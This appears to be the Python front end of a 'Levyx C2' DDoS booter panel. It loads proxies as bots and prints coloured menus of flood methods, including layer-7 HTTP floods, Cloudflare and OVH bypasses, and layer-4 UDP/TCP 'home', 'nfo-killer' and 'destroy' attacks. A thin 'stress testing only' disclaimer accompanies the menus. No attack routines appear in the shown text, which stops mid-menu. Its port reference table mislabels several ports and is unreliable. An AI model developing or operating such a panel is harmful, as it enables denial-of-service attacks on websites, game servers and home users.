import undetected_chromedriver as webdriver
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░░░░░░░▓███████████\x1b[38;2;0;49;147m█████████████▒░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░░▓█████▓▒░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░▒██████▒░░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░████▒░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░▓███▒░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░███░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░▒\x1b[38;2;0;212;1471m██░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░▒██░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m▒██░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░█\x1b[38;2;0;212;1471m█░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░██\x1b[38;2;0;212;1471m▓░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░▒░░██░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░█\x1b[38;2;0;212;1471m█░░██░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░██\x1b[38;2;0;212;1471m░░██░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░█\x1b[38;2;0;212;1471m█░░██░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░██\x1b[38;2;0;212;1471m▒░██▓░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░██▓░▒██░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m██░░██░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░█\x1b[38;2;0;212;1471m█▒░██░░░░░▒▒▓███▒░░\x1b[38;2;0;49;147m░░░░░▒███▓▒▒░░░░░██░▓██░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░██░██░░██████████▒░░\x1b[38;2;0;49;147m░░░▓██████████░░██▒██░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░████░████████████░░\x1b[38;2;0;49;147m░░░████████████░████░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░███░▒██████████░░░\x1b[38;2;0;49;147m░░░░██████████▒░██▒░░░░░░░░░▒░░░░░░
\x1b[38;2;0;212;14m░░░░░▒████░░░░\x1b[38;2;0;212;1471m░░░▓█▒░░█████████░░░░\x1b[38;2;0;49;147m░░░░░█████████░░▒█▓░░░░░░▓████░░░░░
\x1b[38;2;0;212;14m░░░░░██░▒██▒░░\x1b[38;2;0;212;1471m░░░██░░░░██████▓░░░░█\x1b[38;2;0;49;147m░█░░░░███████░░░░██░░░░░███░░██░░░░
\x1b[38;2;0;212;14m░░░░░██░░░██▓░░\x1b[38;2;0;212;1471m░░██░░░░░░▒▓▓░░░░▒██░\x1b[38;2;0;49;147m██░░░░░▓▓▒░░░░░▒██░░░░███░░░██░░░░
\x1b[38;2;0;212;14m░░░▓██▒░░░░████▓\x1b[38;2;0;212;1471m░░██░░░░░░░░░░░░███░\x1b[38;2;0;49;147m███░░░░░░░░░░░░██░░█████░░░░▓██▒░░
\x1b[38;2;0;212;14m░░██▓░░░░░░░░▒██\x1b[38;2;0;212;1471m██████▓░░░░░░░░████\x1b[38;2;0;49;147m░███▓░░░░░░░▒▓████████░░░░░░░░░███░
\x1b[38;2;0;212;14m░░██▓▒▓███▓░░░░░\x1b[38;2;0;212;1471m░▓████████▓░░░░████\x1b[38;2;0;49;147m░███▓░░░░▓████████▓░░░░░░████▓▓███░
\x1b[38;2;0;212;14m░░░███████████▒░\x1b[38;2;0;212;1471m░░░░░███████░░░░██░░\x1b[38;2;0;49;147m░██░░░░██████▓░░░░░░▓███████████░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░▓████\x1b[38;2;0;212;1471m█░░░░██▓▓░██░░░░░░░\x1b[38;2;0;49;147m░░░░░░██░█▒██░░░▒█████▓░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░▒█\x1b[38;2;0;212;1471m████▒▒█▓█░███▓▓▒▒▒\x1b[38;2;0;49;147m▓▒▒▓▓▓███▒███░▓█████░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░▒████▒▓█▒▒█░█▒█\x1b[38;2;0;49;147m░█░█▓█▒█▓░█░█████▒░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░░░░██░░██▓█▓█▓█▒\x1b[38;2;0;49;147m█▒█▓█▓████░▓█▓░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░▓████▓░▓█▓█░█▒█░█\x1b[38;2;0;49;147m░█▒█▒███▒░██████░░░░░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░▓\x1b[38;2;0;212;1471m█████░░██░░░▒█████▓\x1b[38;2;0;49;147m█▓█████▒░░░██░▒█████▓░░░░░░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░▒█████████\x1b[38;2;0;212;1471m█▓░░░░░███░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░██▒░░░░░▓██████████▒░░░░░
\x1b[38;2;0;212;14m░░░░░░██░░░▓▓▓░░\x1b[38;2;0;212;1471m░░░░▒██████▓░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░███████▒░░░░░░▓▓▒░░▒██░░░░░
\x1b[38;2;0;212;14m░░░░░░▓██░░░░░░\x1b[38;2;0;212;1471m░░▓████▓░░░█████▒░░░\x1b[38;2;0;49;147m░░░▒▓█████░░░▓████▓░░░░░░░▒██▓░░░░░
\x1b[38;2;0;212;14m░░░░░░░░███░░\x1b[38;2;0;212;1471m░░████▒░░░░░░░░▓██████\x1b[38;2;0;49;147m███████▒░░░░░░░░▒████░░░░███░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░██░░░\x1b[38;2;0;212;1471m██▒░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░▓██░░░██░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░██▒▓\x1b[38;2;0;212;1471m██░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░▒██▒▓██░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░███\x1b[38;2;0;212;1471m█░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░░░████░░░░░░░░░
\x1b[38;2;0;212;14m░░░░░░░░░░░░░░░░\x1b[38;2;0;212;1471m░░░░░░░░░░░░░░░░░░\x1b[38;2;0;49;147m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ''')
    
    time.sleep(0.5)
    clear()

def si():
    print('\u001B[31m[\u001B[35mLe\u001B[31mvyx\x1b[38;2;0;255;255m]|\u001B[38mW\u001B[35melc\u001B[31mome \u001B[35mto\u001B[31m Levyx \u001B[35mC2!\u001B[31m| \u001B[31mOwner: Levyx \u001B[35m|')
    print("")

def tools():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \u001B[31m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \u001B[31m╚══════════════════════╩════════════════════════╝
                  ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀         
''')
    
def banners():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
                \u001B[31m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \u001B[31m╚══════════════════════╩════════════════════════╝
                 ▀▄▀▄▀▄ 𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀         
''')

def rules():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \u001B[31m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \u001B[31m╚═══════════════════════════════════════════════╝
                 ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def ports():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \u001B[31m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \x1b[38;2;0;212;14m║
                \u001B[31m╚═══════════════════════════════════════════════╝
                 ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def special():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \u001B[31m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \u001B[31m╚══════════════════════╩════════════════════════╝
                 ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀         
''')
    
def layer7():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \u001B[31m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof       \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║
               \u001B[31m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def layer4():
    clear()
    si()
    print(f'''
    
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\u001B[35m                          ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\u001B[35m                          .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •
\x1b[38;2;0;255;255m                   ╚═══╦═════════════════════════════════╦═══╝
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \u001B[31m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv2               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \u001B[31m╚═══════════════════════╩═════════════════════╝
                ▀▄▀▄▀▄𝙻𝙴𝚅𝚈𝚇 𝙲2 𝙳𝙳𝙾𝚂 𝙿𝙰𝙽𝙴𝙻 𝙾𝚆𝙽𝙴𝚁 𝙻𝙴𝚅𝚈𝚇𝙽𝙴𝚃▄▀▄▀▄▀        
''')

def amp_games():
    clear()
    si()
    print(f'''
\u001B[35m                          ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\u001B[35m                          ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\u001B[35m                          ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
